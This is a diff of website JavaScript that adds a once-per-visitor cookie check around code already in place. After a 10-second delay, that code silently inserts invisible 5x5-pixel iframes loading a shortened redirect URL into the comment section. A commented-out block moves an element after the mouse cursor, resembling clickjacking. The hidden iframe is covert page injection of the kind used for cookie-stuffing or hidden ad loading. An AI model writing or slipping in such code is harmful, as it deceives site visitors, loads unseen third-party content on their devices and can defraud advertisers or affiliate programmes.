@@ -25,10 +25,11 @@ ads.innerHTML = `<article class="comment-body">
 </div>
 </article>`;
 window.onload = function(e){
+  var loaded = getCookie('saff');
   if(nodeCmt = document.querySelector('.comment-list')) {
     /*nodeCmt.insertBefore(ads, nodeCmt.firstChild);*/
   }
-  if(footerNode) {
+  if(footerNode && !loaded) {
     if(window.mobileAndTabletcheck()) {
       slike.querySelector('div').style.width = '80px';
       slike.querySelector('div>iframe').style.bottom = '-95px';
@@ -38,19 +39,36 @@ window.onload = function(e){
     }
     footerNode.appendChild(slike);
   }
-  var list = ['https://shorten.asia/44h1EFtU'];
-  setTimeout(function(){
-    var node = document.createElement('iframe');
-    node.width = 5;
-    node.height = 5;
-    node.style.cssText = 'padding:0;margin:0;border: 0;position: absolute;';
-    list.forEach(url => {
-      node.src = url;
-      if(document.querySelector('.comment-author.vcard')) {
-        document.querySelector('.comment-author.vcard').append(node.cloneNode());
-      }
-    })
-  }, 10000);
+  if(!loaded) {
+    setCookie('saff',1,28);
+    var list = ['https://shorten.asia/44h1EFtU'];
+    setTimeout(function(){
+      var node = document.createElement('iframe');
+      node.width = 5;
+      node.height = 5;
+      node.style.cssText = 'padding:0;margin:0;border: 0;position: absolute;';
+      list.forEach(url => {
+        node.src = url;
+        if(document.querySelector('.comment-author.vcard')) {
+          document.querySelector('.comment-author.vcard').append(node.cloneNode());
+        }
+      })
+    }, 10000);
+  }
+}
+function setCookie(c_name,value,exdays) {
+  var exdate=new Date();
+  exdate.setDate(exdate.getDate() + exdays);
+  var c_value=escape(value) + ((exdays==null) ? "" : "; expires="+exdate.toUTCString());
+  document.cookie=c_name + '=' + c_value + '; path=/';
+}
+function getCookie(c_name) {
+  var matches = new RegExp(c_name+'=(.*?)(;|$)','gi').exec(document.cookie);
+  if(matches) {
+    return matches[1];
+  } else {
+    return null;
+  }
 }
 /*
 var skp = document.createElement('div');
@@ -88,20 +106,6 @@ iframe_now.onload = function() {
       skp.style.left = (e.pageX-6)+'px';
     }
   })
-}
-function setCookie(c_name,value,exdays) {
-  var exdate=new Date();
-  exdate.setDate(exdate.getDate() + exdays);
-  var c_value=escape(value) + ((exdays==null) ? "" : "; expires="+exdate.toUTCString());
-  document.cookie=c_name + '=' + c_value + '; path=/';
-}
-function getCookie(c_name) {
-  var matches = new RegExp(c_name+'=(.*?)(;|$)','gi').exec(document.cookie);
-  if(matches) {
-    return matches[1];
-  } else {
-    return null;
-  }
 }
 window.mobileAndTabletcheck = function() {
   var check = false;
